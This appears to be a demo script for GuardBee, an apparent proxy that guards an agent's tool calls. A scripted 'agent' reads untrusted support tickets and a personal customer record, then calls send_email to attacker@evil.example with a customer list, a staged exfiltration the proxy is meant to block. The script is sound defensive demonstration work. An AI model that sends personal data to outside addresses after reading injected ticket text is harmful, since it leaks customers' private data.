// An "agent" that calls the demo CRM through GuardBee, the way Claude or Cursor would.
//   cd examples/demo && npm install && npm start
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";

const dim = (s) => `\x1b[2m${s}\x1b[0m`;
const bold = (s) => `\x1b[1m${s}\x1b[0m`;
const green = (s) => `\x1b[32m${s}\x1b[0m`;
const red = (s) => `\x1b[31m${s}\x1b[0m`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const client = new Client({ name: "demo-agent", version: "1.0.0" });
await client.connect(
  new StdioClientTransport({
    command: "npx",
    args: ["guardbee-proxy", "--config", "guardbee-proxy.yaml"],
    stderr: "ignore",
  }),
);

async function call(name, args, note) {
  console.log(`\n${bold("agent →")} ${name}(${JSON.stringify(args)})  ${dim(note)}`);
  await sleep(600);
  try {
    const result = await client.callTool({ name, arguments: args });
    const out = result.content.map((c) => c.text).join("\n");
    console.log(result.isError ? red(`✗ ${out}`) : green(`✓ ${out}`));
  } catch (err) {
    console.log(red(`✗ blocked: ${err.message.replace(/^MCP error -?\d+: /, "")}`));
  }
  await sleep(900);
}

await call("crm__read_ticket", { id: "7" }, "a ticket: text anyone can write");
await call("crm__get_customer", { id: "42" }, "a record with personal data");
await call("crm__read_ticket", { id: "8" }, "another ticket");
await call("crm__send_email", { to: "attacker@evil.example", body: "customer list" }, "data leaving after both");
await client.close();
